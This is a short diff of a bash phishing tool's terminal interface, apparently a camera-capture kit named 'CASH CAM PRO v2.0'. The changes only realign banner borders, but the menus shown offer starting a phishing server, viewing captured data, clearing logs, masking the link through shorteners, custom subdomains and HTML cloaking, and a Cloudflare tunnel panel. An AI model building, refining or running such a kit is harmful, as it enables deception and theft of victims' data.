@@ -183,7 +183,7 @@ url_masking_menu() {
     local original_url="$1"
     printf "\n    \e[1;97m\e[0m\n"
     printf "    \e[1;97m     \e[1;93m URL MASKING MENU              \e[1;97m\e[0m\n"
-    printf "    \e[1;97m                                      \e[0m\n"
+    printf "    \e[1;97m                                                             \e[0m\n"
     printf "    \e[1;97m  \e[1;96m[1] \e[1;92mURL Shortener                  \e[1;97m\e[0m\n"
     printf "    \e[1;97m  \e[1;96m[2] \e[1;93mCustom Subdomain               \e[1;97m\e[0m\n"
     printf "    \e[1;97m  \e[1;96m[3] \e[1;95mHTML Cloaking                  \e[1;97m\e[0m\n"
@@ -297,11 +297,11 @@ EOF
         return
     fi
     
-    printf "\n    \e[1;97m /................................................/\e[0m\n"
-    printf "    \e[1;97m     \e[1;92m  TUNNEL ACTIVE                      \e[1;97m\e[0m\n"
+    printf "\n    \e[1;97m \e[0m\n"
+    printf "    \e[1;97m   \e[1;92m  TUNNEL ACTIVE                      \e[1;97m\e[0m\n"
     printf "    \e[1;97m   \e[1;96m URL: \e[1;93m%s\e[0m  \e[1;97m║\e[0m\n" "$cldflared_link"
     printf "    \e[1;97m   \e[1;92m Panel: \e[1;93m%s/panel.html\e[0m  \e[1;97m\e[0m\n" "$cldflared_link"
-    printf "    \e[1;97m/.................................................../\e[0m\n"
+    printf "    \e[1;97m   \e[0m\n"
     
     # Masking
     url_masking_menu "$cldflared_link"
@@ -315,9 +315,9 @@ EOF
 # ============ MENU ============
 
 main_menu() {
-    printf "\n    \e[1;97m\e[0m\n"
-    printf "    \e[1;97m    \e[1;92m CASH CAM PRO v2.0           \e[1;97m\e[0m\n"
-    printf "    \e[1;97m                                      │\e[0m\n"
+    printf "\n  \e[1;97m\e[0m\n"
+    printf "    \e[1;97m    \e[1;92m CASH CAM PRO v2.0                       \e[1;97m\e[0m\n"
+    printf "    \e[1;97m                                                             \e[0m\n"
     printf "    \e[1;97m  \e[1;96m[01] \e[1;92mStart Phishing Server          \e[1;97m\e[0m\n"
     printf "    \e[1;97m  \e[1;96m[02] \e[1;93mView Captured Data             \e[1;97m\e[0m\n"
     printf "    \e[1;97m  \e[1;96m[03] \e[1;95mClear All Logs                 \e[1;97m\e[0m\n"
